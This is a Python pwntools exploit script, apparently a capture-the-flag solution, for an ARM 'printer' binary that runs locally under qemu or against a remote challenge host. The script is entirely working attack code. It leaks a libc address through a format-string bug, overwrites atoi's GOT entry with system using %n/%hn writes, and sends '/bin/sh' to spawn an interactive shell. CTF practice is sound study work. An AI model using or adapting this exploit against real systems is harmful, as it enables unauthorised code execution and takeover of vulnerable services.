#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./printer')

if args.REMOTE:
	p = remote('pwnremote.threatsims.com', 9100)
	libc = ELF('./arm_libc.so.6')
else:
	if args.D:
		p = process('qemu-arm -g 9000 -L /usr/arm-linux-gnueabi ./printer'.split())
	else:
		p = process('qemu-arm -L /usr/arm-linux-gnueabi ./printer'.split())
	libc = ELF('/usr/arm-linux-gnueabi/lib/libc-2.31.so')

# leak libc
p.sendlineafter(b'> ',b'3')
p.sendlineafter(b'job: ',b'leak')
p.sendlineafter(b'Path: ',b'%17$p')
p.sendlineafter(b'> ',b'1')
p.recvuntil(b'leak ')
_ = p.recvuntil(b' ').split()[0]

libc.address = int(_,16) - 268 - libc.sym.__libc_start_main
log.info('libc.address: ' + hex(libc.address))

# set msb address for GOT overwrite
p.sendlineafter(b'> ',b'3')
p.sendlineafter(b'job: ',b'got')
p.sendlineafter(b'Path: ',b'%' + str(binary.got.atoi + 2).encode() + b'c%19$n')

# overwrite got
p.sendlineafter(b'> ',b'3')
p.sendlineafter(b'job: ',b'overwrite')
p.sendlineafter(b'Path: ',b'%' + str(libc.sym.system >> 16).encode() + b'c%103$hn')

# set lsb address for GOT overwrite
p.sendlineafter(b'> ',b'3')
p.sendlineafter(b'job: ',b'got')
p.sendlineafter(b'Path: ',b'%' + str(binary.got.atoi).encode() + b'c%19$n')

# overwrite got
p.sendlineafter(b'> ',b'3')
p.sendlineafter(b'job: ',b'overwrite')
p.sendlineafter(b'Path: ',b'%' + str(libc.sym.system & 0xffff).encode() + b'c%103$hn')

# trigger
p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'> ',b'/bin/sh')
p.interactive()
